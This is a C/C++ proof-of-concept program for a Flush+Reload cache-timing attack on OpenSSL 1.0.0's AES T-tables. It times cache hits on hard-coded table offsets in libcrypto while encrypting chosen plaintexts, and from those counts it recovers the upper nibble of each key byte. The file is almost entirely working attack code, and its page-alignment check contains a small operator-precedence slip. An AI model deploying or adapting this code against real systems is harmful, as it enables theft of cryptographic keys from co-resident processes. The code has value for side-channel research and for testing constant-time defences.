#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>
#include <algorithm>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (133)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (25000)

unsigned char key[] =
{
  0xc0, 0xf0, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

//std::map<char*, std::map<size_t, size_t> > timings;
int timings[16][16];

char* base;
char* probe;
char* end;
int T[4] = {0x16BEC0, 0x16BAC0, 0x16B6C0, 0x16B2C0};

/*
template<typename KeyType, typename ValueType> 
std::pair<KeyType,ValueType> get_max( const std::map<KeyType,ValueType>& x ) {
  using pairtype=std::pair<KeyType,ValueType>; 
  return *std::max_element(x.begin(), x.end(), [] (const pairtype & p1, const pairtype & p2) {
        return p1.second < p2.second;
  }); 
}*/
int get_max_index(int timings[], int l){
  int res = 0;
  for (int i=0; i < l; i++){
   if (timings[i]>timings[res])
     res=i;
  }
  return res;
}

int main()
{
  int fd = open("libcrypto.so.1.0.0", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  printf("Key used for encryption\n");
  for (size_t j = 0; j < 16; ++j){ //randomize the key for encryption
          key[j] = rand() % 256;
    printf("%02x ", key[j]);
  }
  printf("\n");

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;

for (size_t b =0; b < 16; ++b){ // the b-th byte
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    unsigned char key_guess = byte;
    
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    //AES_encrypt(plaintext, ciphertext, &key_struct);

    for (size_t l = 0; l < 1; ++l) // recover by any single memory line 
    {
    	probe = base + T[b % 4] + 64 * l;
    	size_t count=0;
    	
    	for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)  
    	{
      	for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
        plaintext[b] = ((l * 16) + (rand() % 16)) ^ key_guess;
        flush(probe);
      	AES_encrypt(plaintext, ciphertext, &key_struct);
      	sched_yield();
      	size_t time = rdtsc();
      	maccess(probe);
      	size_t delta = rdtsc() - time;
      	sched_yield();
      	if (delta < MIN_CACHE_MISS_CYCLES)
      	{ 
	  count++;
      	}     
      	sched_yield();
      	timings[b][byte/16] = count;
      	sched_yield();
    	}
    }

  }
    int tmp[16];
    for (size_t byte = 0; byte < 16; ++byte) tmp[byte] = timings[b][byte];
    int max=get_max_index(tmp,16);
    printf("%x ", max);
    
}//end of b bytes
   printf("\n");
  for (size_t b = 0; b < 16; ++b)
  {
    //printf("%p", (void*) (ait.first - base));
    for (size_t byte=0; byte < 16; ++byte)
    {
      printf("%6u ", timings[b][byte]);
    }
    printf("\n");
  }

  printf("\n");
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

